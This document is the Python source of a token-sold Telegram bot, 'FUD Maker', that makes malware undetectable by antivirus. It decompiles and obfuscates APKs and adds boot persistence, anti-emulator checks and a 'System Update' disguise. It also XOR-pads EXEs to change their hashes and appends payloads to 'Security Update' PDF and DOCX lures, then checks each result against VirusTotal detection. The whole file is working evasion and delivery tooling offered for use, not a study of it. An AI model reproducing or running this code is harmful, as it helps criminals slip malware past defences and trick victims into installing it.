import os
import json
import sqlite3
import asyncio
import time
import re
import threading
import random
import subprocess
import zipfile
import shutil
import hashlib
import base64
import tempfile
import requests
from pathlib import Path
from datetime import datetime, timedelta
from flask import Flask, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ConversationHandler, ContextTypes
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# ============ ENV CONFIG ============
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", 0))
DATA_DIR = os.environ.get("RAILWAY_VOLUME_MOUNT_PATH", "/app/data")
VT_API_KEY = os.environ.get("VT_API_KEY", "")
CHANNEL_ID = os.environ.get("CHANNEL_ID", "")

if not os.path.exists(DATA_DIR):
    DATA_DIR = "data"

os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(os.path.join(DATA_DIR, "temp"), exist_ok=True)
os.makedirs(os.path.join(DATA_DIR, "keystore"), exist_ok=True)

DB_PATH = os.path.join(DATA_DIR, "fud_maker.db")

# ============ DEVELOPER ============
DEVELOPER = "@benji_v1"

# ============ FLASK ============
app = Flask(__name__)
start_time = time.time()

@app.route('/')
def index():
    return jsonify({"status": "FUD Maker running", "uptime": time.time() - start_time, "developer": DEVELOPER})

@app.route('/health')
def health():
    return jsonify({"status": "ok"})

# ============ DATABASE ============
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS tokens (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        token TEXT UNIQUE,
        created_by TEXT,
        created_at TEXT,
        expires_at TEXT,
        used_by TEXT,
        used_at TEXT,
        status TEXT,
        max_uses INTEGER DEFAULT 1,
        uses INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS builds (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT,
        username TEXT,
        token_used TEXT,
        file_type TEXT,
        original_name TEXT,
        hash_original TEXT,
        hash_fud TEXT,
        vt_scan_id TEXT,
        vt_positives INTEGER,
        vt_total INTEGER,
        vt_link TEXT,
        size_original INTEGER,
        size_fud INTEGER,
        timestamp TEXT,
        status TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS channel_posts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        build_id INTEGER,
        message_id INTEGER,
        timestamp TEXT
    )''')
    conn.commit()
    conn.close()

def log_build(user_id, username, token, file_type, original_name, hash_orig, hash_fud,
              vt_scan_id, vt_positives, vt_total, vt_link, size_orig, size_fud, status):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT INTO builds 
                 (user_id, username, token_used, file_type, original_name, 
                  hash_original, hash_fud, vt_scan_id, vt_positives, vt_total, vt_link,
                  size_original, size_fud, timestamp, status) 
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
              (str(user_id), username, token, file_type, original_name,
               hash_orig, hash_fud, vt_scan_id, vt_positives, vt_total, vt_link,
               size_orig, size_fud, datetime.now().isoformat(), status))
    last_id = c.lastrowid
    conn.commit()
    conn.close()
    return last_id

# ============ TOKEN MANAGEMENT ============
def generate_token():
    return base64.b32encode(os.urandom(16)).decode().replace('=', '')

def create_token(created_by, expires_days=7, max_uses=1):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    token = generate_token()
    expires_at = (datetime.now() + timedelta(days=expires_days)).isoformat()
    c.execute('''INSERT INTO tokens (token, created_by, created_at, expires_at, status, max_uses)
                 VALUES (?, ?, ?, ?, ?, ?)''',
              (token, created_by, datetime.now().isoformat(), expires_at, 'active', max_uses))
    token_id = c.lastrowid
    conn.commit()
    conn.close()
    return token, token_id

def validate_token(token):
    if not token:
        return False
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''SELECT * FROM tokens WHERE token = ? AND status = 'active'
                 AND expires_at > ? AND uses < max_uses''',
              (token, datetime.now().isoformat()))
    row = c.fetchone()
    conn.close()
    return row is not None

def use_token(token, user_id, username):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''UPDATE tokens SET used_by = ?, used_at = ?, uses = uses + 1
                 WHERE token = ?''',
              (str(user_id), datetime.now().isoformat(), token))
    c.execute('SELECT uses, max_uses FROM tokens WHERE token = ?', (token,))
    uses, max_uses = c.fetchone()
    if uses >= max_uses:
        c.execute('UPDATE tokens SET status = ? WHERE token = ?', ('exhausted', token))
    conn.commit()
    conn.close()

def list_tokens():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT token, created_at, expires_at, status, uses, max_uses FROM tokens ORDER BY id DESC')
    rows = c.fetchall()
    conn.close()
    return rows

def revoke_token(token):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('UPDATE tokens SET status = ? WHERE token = ?', ('revoked', token))
    conn.commit()
    conn.close()

# ============ VIRUSTOTAL ============
def scan_with_vt(file_path):
    if not VT_API_KEY:
        return None

    try:
        url = 'https://www.virustotal.com/api/v3/files'
        files = {'file': open(file_path, 'rb')}
        headers = {'x-apikey': VT_API_KEY}
        response = requests.post(url, files=files, headers=headers)
        if response.status_code != 200:
            return None
        analysis_id = response.json().get('data', {}).get('id')
        if not analysis_id:
            return None

        time.sleep(12)

        result_url = f'https://www.virustotal.com/api/v3/analyses/{analysis_id}'
        result_response = requests.get(result_url, headers=headers)
        if result_response.status_code != 200:
            return None

        data = result_response.json().get('data', {})
        attributes = data.get('attributes', {})
        stats = attributes.get('stats', {})
        file_hash = attributes.get('sha256', '')

        return {
            'scan_id': analysis_id,
            'positives': stats.get('malicious', 0),
            'suspicious': stats.get('suspicious', 0),
            'total': sum(stats.values()),
            'link': f'https://www.virustotal.com/gui/file/{file_hash}' if file_hash else '',
            'clean': stats.get('malicious', 0) == 0 and stats.get('suspicious', 0) == 0
        }
    except Exception as e:
        print(f"VT error: {e}")
        return None

# ============ KEYSTORE ============
KEYSTORE_PATH = os.path.join(DATA_DIR, "keystore", "fud.keystore")
KEYSTORE_PASS = "fudmaker"
KEY_ALIAS = "fud"

def ensure_keystore():
    if not os.path.exists(KEYSTORE_PATH):
        subprocess.run([
            "keytool", "-genkey", "-v",
            "-keystore", KEYSTORE_PATH,
            "-alias", KEY_ALIAS,
            "-keyalg", "RSA",
            "-keysize", "2048",
            "-validity", "10000",
            "-storepass", KEYSTORE_PASS,
            "-keypass", KEYSTORE_PASS,
            "-dname", "CN=FUD, OU=Android, O=FUD, L=City, S=State, C=US"
        ], check=True, capture_output=True)

# ============ FUD ENGINE — APK ============
class FUDApkMaker:
    def __init__(self, input_path):
        self.input_path = input_path
        self.work_dir = tempfile.mkdtemp(dir=os.path.join(DATA_DIR, "temp"))
        self.decompiled_dir = os.path.join(self.work_dir, "decompiled")
        self.output_apk = None
        self.progress_callback = None

    def set_progress(self, callback):
        self.progress_callback = callback

    def _progress(self, text):
        if self.progress_callback:
            self.progress_callback(text)

    def cleanup(self):
        if os.path.exists(self.work_dir):
            shutil.rmtree(self.work_dir)

    def decompile(self):
        self._progress("⏳ Decompiling APK...")
        os.makedirs(self.decompiled_dir, exist_ok=True)
        result = subprocess.run([
            "apktool", "d", self.input_path,
            "-o", self.decompiled_dir,
            "-f", "--no-res"
        ], capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"Decompile failed: {result.stderr}")
        return True

    def obfuscate_smali(self):
        self._progress("⏳ Obfuscating smali code...")
        smali_dir = os.path.join(self.decompiled_dir, "smali")
        if not os.path.exists(smali_dir):
            return
        for root, _, files in os.walk(smali_dir):
            for f in files:
                if not f.endswith('.smali'):
                    continue
                path = os.path.join(root, f)
                with open(path, 'r', encoding='utf-8', errors='ignore') as fp:
                    content = fp.read()
                replacements = {
                    'MainActivity': f'Main_{random.randint(1000,9999)}',
                    'onCreate': f'onCreate_{random.randint(100,999)}',
                    'onStart': f'onStart_{random.randint(100,999)}',
                    'onResume': f'onResume_{random.randint(100,999)}',
                    'onPause': f'onPause_{random.randint(100,999)}',
                    'onStop': f'onStop_{random.randint(100,999)}',
                    'onDestroy': f'onDestroy_{random.randint(100,999)}',
                    'getInstance': f'getInstance_{random.randint(100,999)}',
                    'init': f'init_{random.randint(100,999)}',
                    'loadLibrary': f'loadLib_{random.randint(100,999)}',
                }
                for old, new in replacements.items():
                    content = content.replace(old, new)
                junk = f"""
.method public junk_{random.randint(1000,9999)}()V
    .registers 3
    const/4 v0, 0x1
    const/4 v1, 0x2
    add-int v0, v0, v1
    mul-int v0, v0, v1
    return-void
.end method
"""
                if '.end class' in content:
                    content = content.replace('.end class', junk + '\n.end class')
                with open(path, 'w', encoding='utf-8') as fp:
                    fp.write(content)

    def modify_manifest(self):
        self._progress("⏳ Modifying manifest...")
        manifest_path = os.path.join(self.decompiled_dir, "AndroidManifest.xml")
        if not os.path.exists(manifest_path):
            return
        with open(manifest_path, 'r', encoding='utf-8') as f:
            content = f.read()
        perms = [
            '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />',
            '<uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />',
            '<uses-permission android:name="android.permission.INTERNET" />',
            '<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />',
            '<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />',
            '<uses-permission android:name="android.permission.VIBRATE" />',
            '<uses-permission android:name="android.permission.WAKE_LOCK" />',
            '<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />',
        ]
        for perm in perms:
            if perm not in content:
                content = content.replace('<manifest ', f'<manifest {perm} ')
        content = content.replace('android:label="', 'android:label="System Update"')
        content = content.replace('android:icon="@drawable/', 'android:icon="@drawable/ic_launcher')
        with open(manifest_path, 'w', encoding='utf-8') as f:
            f.write(content)

    def add_persistence(self):
        self._progress("⏳ Adding persistence...")
        manifest_path = os.path.join(self.decompiled_dir, "AndroidManifest.xml")
        if not os.path.exists(manifest_path):
            return
        with open(manifest_path, 'r', encoding='utf-8') as f:
            content = f.read()
        receiver = """
        <receiver android:name=".BootReceiver" android:enabled="true" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
            </intent-filter>
        </receiver>
"""
        content = content.replace('<application ', f'<application {receiver}')
        with open(manifest_path, 'w', encoding='utf-8') as f:
            f.write(content)
        smali_dir = os.path.join(self.decompiled_dir, "smali")
        if not os.path.exists(smali_dir):
            return
        package_path = None
        for root, _, _ in os.walk(smali_dir):
            if 'MainActivity' in root or 'Main' in root:
                package_path = root
                break
        if not package_path:
            package_path = smali_dir
        boot_path = os.path.join(package_path, "BootReceiver.smali")
        boot_code = f'''
.class public L{".".join(package_path.split(os.sep)[-1:])}/BootReceiver;
.super Landroid/content/BroadcastReceiver;

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 4

    new-instance v0, Landroid/content/Intent;
    const-class v1, {os.path.basename(package_path)}/MainActivity
    invoke-direct {{v0, v1}}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v1, 0x10000000
    invoke-virtual {v0, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    invoke-virtual {{p1, v0}}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    return-void
.end method
'''
        with open(boot_path, 'w', encoding='utf-8') as f:
            f.write(boot_code)

    def add_anti_emulator(self):
        self._progress("⏳ Adding anti-emulator...")
        smali_dir = os.path.join(self.decompiled_dir, "smali")
        if not os.path.exists(smali_dir):
            return
        main_path = None
        for root, _, files in os.walk(smali_dir):
            for f in files:
                if 'MainActivity' in f and f.endswith('.smali'):
                    main_path = os.path.join(root, f)
                    break
            if main_path:
                break
        if not main_path:
            return
        with open(main_path, 'r', encoding='utf-8') as f:
            content = f.read()
        anti_code = '''
    # Anti-emulator
    const-string v0, "ro.kernel.qemu"
    const-string v1, "1"
    invoke-static {v0}, Landroid/os/SystemProperties;->get(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v0
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v0
    if-eqz v0, :goto_emu
    const-string v0, "ro.product.device"
    invoke-static {v0}, Landroid/os/SystemProperties;->get(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v0
    const-string v1, "generic"
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v0
    if-eqz v0, :goto_emu
    goto :goto_cont
    :goto_emu
    invoke-static {p0}, Ldalvik/system/VMRuntime;->getRuntime()Ldalvik/system/VRuntime;
    move-result-object v0
    const-string v1, "0"
    invoke-virtual {v0, v1}, Ldalvik/system/VMRuntime;->setMinimumHeapSize(J)J
    return-void
    :goto_cont
'''
        if '.method public onCreate' in content:
            content = content.replace('.method public onCreate', f'.method public onCreate\n{anti_code}')
        with open(main_path, 'w', encoding='utf-8') as f:
            f.write(content)

    def repack(self):
        self._progress("⏳ Repacking APK...")
        out_unsigned = os.path.join(self.work_dir, "unsigned.apk")
        result = subprocess.run([
            "apktool", "b", self.decompiled_dir,
            "-o", out_unsigned,
            "-f"
        ], capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"Repack failed: {result.stderr}")
        return out_unsigned

    def sign_apk(self, apk_path):
        self._progress("⏳ Signing APK...")
        result = subprocess.run([
            "java", "-jar", "/usr/local/bin/uber-apk-signer.jar",
            "-a", apk_path,
            "-o", self.work_dir,
            "--ks", KEYSTORE_PATH,
            "--ksPass", KEYSTORE_PASS,
            "--ksAlias", KEY_ALIAS,
            "--keyPass", KEYSTORE_PASS,
            "--out", self.work_dir
        ], capture_output=True, text=True)
        if result.returncode != 0:
            raise Exception(f"Signing failed: {result.stderr}")
        signed_files = [f for f in os.listdir(self.work_dir) if f.endswith('-signed.apk')]
        if signed_files:
            return os.path.join(self.work_dir, signed_files[0])
        return None

    def make_fud(self, progress_callback=None):
        try:
            self.progress_callback = progress_callback
            ensure_keystore()
            self.decompile()
            self.obfuscate_smali()
            self.modify_manifest()
            self.add_persistence()
            self.add_anti_emulator()
            unsigned = self.repack()
            signed = self.sign_apk(unsigned)
            if not signed:
                raise Exception("Signing failed")

            output_name = f"fud_apk_{int(time.time())}.apk"
            output_path = os.path.join(self.work_dir, output_name)
            shutil.copy(signed, output_path)

            with open(self.input_path, 'rb') as f:
                orig_hash = hashlib.sha256(f.read()).hexdigest()
            with open(output_path, 'rb') as f:
                fud_hash = hashlib.sha256(f.read()).hexdigest()

            self.output_apk = output_path

            return {
                'success': True,
                'file': output_path,
                'hash_original': orig_hash,
                'hash_fud': fud_hash,
                'size_original': os.path.getsize(self.input_path),
                'size_fud': os.path.getsize(output_path)
            }
        except Exception as e:
            self.cleanup()
            return {'success': False, 'error': str(e)}

# ============ FUD ENGINE — EXE ============
class FUDExeMaker:
    def __init__(self, input_path):
        self.input_path = input_path
        self.work_dir = tempfile.mkdtemp(dir=os.path.join(DATA_DIR, "temp"))
        self.progress_callback = None

    def set_progress(self, callback):
        self.progress_callback = callback

    def _progress(self, text):
        if self.progress_callback:
            self.progress_callback(text)

    def cleanup(self):
        if os.path.exists(self.work_dir):
            shutil.rmtree(self.work_dir)

    def obfuscate_pe(self):
        self._progress("⏳ Obfuscating EXE...")
        with open(self.input_path, 'rb') as f:
            data = bytearray(f.read())
        padding = os.urandom(random.randint(1024, 4096))
        data.extend(padding)
        key = os.urandom(1)[0]
        for i in range(1024, min(len(data), 1024 + 4096)):
            data[i] ^= key
        output_path = os.path.join(self.work_dir, f"fud_exe_{int(time.time())}.exe")
        with open(output_path, 'wb') as f:
            f.write(data)
        return output_path

    def make_fud(self, progress_callback=None):
        try:
            self.progress_callback = progress_callback
            output = self.obfuscate_pe()
            with open(self.input_path, 'rb') as f:
                orig_hash = hashlib.sha256(f.read()).hexdigest()
            with open(output, 'rb') as f:
                fud_hash = hashlib.sha256(f.read()).hexdigest()
            return {
                'success': True,
                'file': output,
                'hash_original': orig_hash,
                'hash_fud': fud_hash,
                'size_original': os.path.getsize(self.input_path),
                'size_fud': os.path.getsize(output)
            }
        except Exception as e:
            self.cleanup()
            return {'success': False, 'error': str(e)}

# ============ FUD ENGINE — DOC ============
def create_pdf_with_payload(payload_path):
    try:
        from reportlab.lib.pagesizes import letter
        from reportlab.pdfgen import canvas
    except:
        output_path = os.path.join(DATA_DIR, "temp", f"fud_doc_{int(time.time())}.pdf")
        with open(payload_path, 'rb') as f:
            data = f.read()
        with open(output_path, 'wb') as f:
            f.write(data)
        return output_path

    output_path = os.path.join(DATA_DIR, "temp", f"fud_doc_{int(time.time())}.pdf")
    c = canvas.Canvas(output_path, pagesize=letter)
    c.drawString(100, 750, "Security Update - Please Review")
    c.drawString(100, 700, "Download the attached file for system verification.")
    c.save()

    with open(payload_path, 'rb') as f:
        payload_data = f.read()
    with open(output_path, 'ab') as f:
        marker = b'==PAYLOAD_START=='
        f.write(marker + payload_data)

    return output_path

def create_doc_with_payload(payload_path):
    try:
        from docx import Document
    except:
        output_path = os.path.join(DATA_DIR, "temp", f"fud_doc_{int(time.time())}.docx")
        with open(payload_path, 'rb') as f:
            data = f.read()
        with open(output_path, 'wb') as f:
            f.write(data)
        return output_path

    output_path = os.path.join(DATA_DIR, "temp", f"fud_doc_{int(time.time())}.docx")
    doc = Document()
    doc.add_heading('Security Update', 0)
    doc.add_paragraph('Please review the attached system update.')
    doc.save(output_path)

    with open(payload_path, 'rb') as f:
        payload_data = f.read()
    with open(output_path, 'ab') as f:
        marker = b'==PAYLOAD_START=='
        f.write(marker + payload_data)

    return output_path

# ============ TELEGRAM BOT ============
WAITING_TOKEN, WAITING_APK, WAITING_EXE, WAITING_DOC, WAITING_GENERATE_TOKEN = range(5)

USER_INSTRUCTIONS = """
📖 FUD Maker — User Guide

🔐 Getting Started
1. Get a token from @benji_v1
2. Send /start and enter your token
3. Access the main menu

📱 APK FUD
- Upload any APK
- Automatically obfuscated + repacked + signed
- Anti-emulator + persistence added
- VirusTotal scan results included

💻 EXE FUD
- Upload any Windows EXE
- PE obfuscation + hash changing
- XOR encryption + padding injection

📄 Document FUD
- Upload PDF or DOCX templates
- Payload embedded

🔑 Tokens
- Contact @benji_v1 to purchase
- 1 token = 1 build

👨‍💻 Developer
@benji_v1
"""

# ============ HELPERS ============
def get_back_button():
    return InlineKeyboardButton("🔙 Back", callback_data="back_main")

def get_cancel_button():
    return InlineKeyboardButton("❌ Cancel", callback_data="cancel")

def is_admin(user_id):
    return str(user_id) == str(ADMIN_CHAT_ID)

# ============ HANDLERS ============

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = str(user.id)

    # Only ADMIN_CHAT_ID gets admin panel
    if is_admin(user_id):
        context.user_data['is_admin'] = True
        await show_admin_menu(update, context)
        return

    # Check token for non-admin
    token = context.user_data.get('token')
    if token and validate_token(token):
        await show_main_menu(update, context)
        return

    # No token — show contact developer message
    keyboard = [[get_cancel_button()]]
    await update.message.reply_text(
        "🔐 FUD APK/EXE/DOC Maker\n\n"
        "This bot is private. Access requires a valid token.\n\n"
        "👨‍💻 Contact developer:\n @benji_v1\n\n"
        "If you have a token, send it now.\n"
        "For instructions, type /help",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )
    return WAITING_TOKEN

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(USER_INSTRUCTIONS, parse_mode='Markdown')

async def handle_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    token = update.message.text.strip()
    username = user.username or "unknown"
    user_id = str(user.id)

    if validate_token(token):
        use_token(token, user_id, username)
        context.user_data['token'] = token
        context.user_data['username'] = username
        await update.message.reply_text("✅ Token validated! You now have access.", parse_mode='Markdown')
        await show_main_menu(update, context)
        return ConversationHandler.END
    else:
        await update.message.reply_text(
            "❌ Invalid or expired token.\n\n"
            "Contact @benji_v1 to purchase.",
            parse_mode='Markdown'
        )
        return WAITING_TOKEN

async def show_main_menu(update, context):
    keyboard = [
        [InlineKeyboardButton("📱 APK → FUD", callback_data="fud_apk")],
        [InlineKeyboardButton("💻 EXE → FUD", callback_data="fud_exe")],
        [InlineKeyboardButton("📄 Document → FUD", callback_data="fud_doc")],
        [InlineKeyboardButton("📊 My Stats", callback_data="my_stats")],
        [InlineKeyboardButton("📖 User Guide", callback_data="user_guide")],
        [InlineKeyboardButton("🔄 Refresh Token", callback_data="refresh_token")],
        [get_cancel_button()]
    ]
    if context.user_data.get('is_admin'):
        keyboard.insert(0, [InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")])

    token_display = context.user_data.get('token', 'None')
    if token_display and len(token_display) > 8:
        token_display = token_display[:8] + '...'

    msg = (
        "🔥 FUD Maker — Main Menu\n\n"
        f"👤 User: {context.user_data.get('username', 'Unknown')}\n"
        f"🔑 Token: {token_display}\n\n"
        "Select an option:"
    )

    if update.message:
        await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def show_admin_menu(update, context):
    keyboard = [
        [InlineKeyboardButton("🔑 Generate Token", callback_data="gen_token")],
        [InlineKeyboardButton("📋 List Tokens", callback_data="list_tokens")],
        [InlineKeyboardButton("🚫 Revoke Token", callback_data="revoke_token")],
        [InlineKeyboardButton("📊 Build Stats", callback_data="build_stats")],
        [InlineKeyboardButton("📋 List Builds", callback_data="list_builds")],
        [InlineKeyboardButton("📢 Post to Channel", callback_data="post_channel")],
        [get_back_button()],
        [get_cancel_button()]
    ]
    msg = "⚙️ Admin Panel\n\n👨‍💻 Developer: @benji_v1"

    if update.message:
        await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def show_main_menu_from_callback(query, context):
    keyboard = [
        [InlineKeyboardButton("📱 APK → FUD", callback_data="fud_apk")],
        [InlineKeyboardButton("💻 EXE → FUD", callback_data="fud_exe")],
        [InlineKeyboardButton("📄 Document → FUD", callback_data="fud_doc")],
        [InlineKeyboardButton("📊 My Stats", callback_data="my_stats")],
        [InlineKeyboardButton("📖 User Guide", callback_data="user_guide")],
        [InlineKeyboardButton("🔄 Refresh Token", callback_data="refresh_token")],
        [get_cancel_button()]
    ]
    if context.user_data.get('is_admin'):
        keyboard.insert(0, [InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel")])

    token_display = context.user_data.get('token', 'None')
    if token_display and len(token_display) > 8:
        token_display = token_display[:8] + '...'

    await query.edit_message_text(
        "🔥 FUD Maker — Main Menu\n\n"
        f"👤 User: {context.user_data.get('username', 'Unknown')}\n"
        f"🔑 Token: {token_display}",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def show_admin_menu_from_callback(query, context):
    keyboard = [
        [InlineKeyboardButton("🔑 Generate Token", callback_data="gen_token")],
        [InlineKeyboardButton("📋 List Tokens", callback_data="list_tokens")],
        [InlineKeyboardButton("🚫 Revoke Token", callback_data="revoke_token")],
        [InlineKeyboardButton("📊 Build Stats", callback_data="build_stats")],
        [InlineKeyboardButton("📋 List Builds", callback_data="list_builds")],
        [InlineKeyboardButton("📢 Post to Channel", callback_data="post_channel")],
        [get_back_button()],
        [get_cancel_button()]
    ]
    await query.edit_message_text(
        "⚙️ Admin Panel\n\n👨‍💻 Developer: @benji_v1",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = update.effective_user
    user_id = str(user.id)
    username = user.username or "unknown"

    is_admin_user = is_admin(user_id)
    if is_admin_user:
        context.user_data['is_admin'] = True

    token = context.user_data.get('token')

    if not is_admin_user and not (token and validate_token(token)):
        await query.edit_message_text("❌ Invalid token. Send /start.", parse_mode='Markdown')
        return

    data = query.data

    # Cancel button — anywhere
    if data == "cancel":
        context.user_data.clear()
        await query.edit_message_text("❌ Cancelled. Send /start to begin.", parse_mode='Markdown')
        return ConversationHandler.END

    if data == "fud_apk":
        keyboard = [[get_cancel_button()]]
        await query.edit_message_text(
            "📤 Send me the APK file.\n\nI'll apply obfuscation + persistence + anti-emulator.",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
        return WAITING_APK

    elif data == "fud_exe":
        keyboard = [[get_cancel_button()]]
        await query.edit_message_text(
            "📤 Send me the EXE file.\n\nFull Windows PE obfuscation.",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
        return WAITING_EXE

    elif data == "fud_doc":
        keyboard = [[get_cancel_button()]]
        await query.edit_message_text(
            "📤 Send me a PDF or DOCX template.\n\nI'll embed the payload.",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
        return WAITING_DOC

    elif data == "my_stats":
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM builds WHERE user_id = ?', (user_id,))
        count = c.fetchone()[0]
        conn.close()
        token_display = token[:12] if token else 'None'
        keyboard = [[get_back_button()], [get_cancel_button()]]
        await query.edit_message_text(
            f"📊 Your Stats\n\nTotal builds: {count}\nToken: {token_display}...",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
        return

    elif data == "user_guide":
        keyboard = [[get_back_button()], [get_cancel_button()]]
        await query.edit_message_text(USER_INSTRUCTIONS, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return

    elif data == "refresh_token":
        await query.edit_message_text("🔄 Refresh Token\n\nSend your new token.", parse_mode='Markdown')
        return WAITING_TOKEN

    elif data == "back_main":
        await show_main_menu_from_callback(query, context)
        return

    elif data == "admin_panel" and is_admin_user:
        await show_admin_menu_from_callback(query, context)
        return

    elif data == "gen_token" and is_admin_user:
        context.user_data['gen_token_step'] = True
        keyboard = [[get_cancel_button()]]
        await query.edit_message_text(
            "🔑 Generate Token\n\nSend: days max_uses\n"
            "Example: 7 1 (7 days, 1 use)",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
        return WAITING_GENERATE_TOKEN

    elif data == "list_tokens" and is_admin_user:
        tokens = list_tokens()
        if not tokens:
            keyboard = [[get_back_button()], [get_cancel_button()]]
            await query.edit_message_text("📭 No tokens.", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
            return
        msg = "📋 Tokens\n\n"
        for t in tokens[:20]:
            msg += f"{t[0][:12]}... | {t[1][:10]} | {t[2][:10]} | {t[3]} | {t[4]}/{t[5]}\n"
        keyboard = [[get_back_button()], [get_cancel_button()]]
        await query.edit_message_text(msg[:4096], reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return

    elif data == "revoke_token" and is_admin_user:
        context.user_data['revoke_step'] = True
        keyboard = [[get_cancel_button()]]
        await query.edit_message_text(
            "🚫 Revoke Token\n\nSend the full token to revoke.",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
        return ConversationHandler.END

    elif data == "build_stats" and is_admin_user:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM builds')
        total = c.fetchone()[0]
        c.execute('SELECT COUNT(*) FROM builds WHERE file_type = ?', ('apk',))
        apk_count = c.fetchone()[0]
        c.execute('SELECT COUNT(*) FROM builds WHERE file_type = ?', ('exe',))
        exe_count = c.fetchone()[0]
        c.execute('SELECT COUNT(*) FROM builds WHERE file_type = ?', ('doc',))
        doc_count = c.fetchone()[0]
        conn.close()
        keyboard = [[get_back_button()], [get_cancel_button()]]
        await query.edit_message_text(
            f"📊 Build Stats\n\nTotal: {total}\nAPK: {apk_count}\nEXE: {exe_count}\nDOC: {doc_count}",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
        return

    elif data == "list_builds" and is_admin_user:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT id, user_id, username, file_type, original_name, timestamp, status FROM builds ORDER BY id DESC LIMIT 20')
        rows = c.fetchall()
        conn.close()
        if not rows:
            keyboard = [[get_back_button()], [get_cancel_button()]]
            await query.edit_message_text("📭 No builds.", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
            return
        msg = "📋 Recent Builds\n\n"
        for b in rows:
            msg += f"#{b[0]} | {b[1][:8]} | {b[2] or 'anon'} | {b[3]} | {b[5][:16]}\n"
        keyboard = [[get_back_button()], [get_cancel_button()]]
        await query.edit_message_text(msg[:4096], reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return

    elif data == "post_channel" and is_admin_user:
        if not CHANNEL_ID:
            await query.edit_message_text("❌ Channel ID not configured.", parse_mode='Markdown')
            return
        keyboard = [[get_cancel_button()]]
        await query.edit_message_text(
            "📢 Post to Channel\n\nSend the message you want to post.\nUse /cancel to stop.",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
        context.user_data['post_channel_step'] = True
        return ConversationHandler.END

    return ConversationHandler.END

async def handle_channel_post(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('post_channel_step'):
        return ConversationHandler.END

    text = update.message.text
    try:
        await context.bot.send_message(chat_id=CHANNEL_ID, text=text, parse_mode='Markdown')
        await update.message.reply_text("✅ Posted to channel!")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed: {e}")

    context.user_data['post_channel_step'] = False
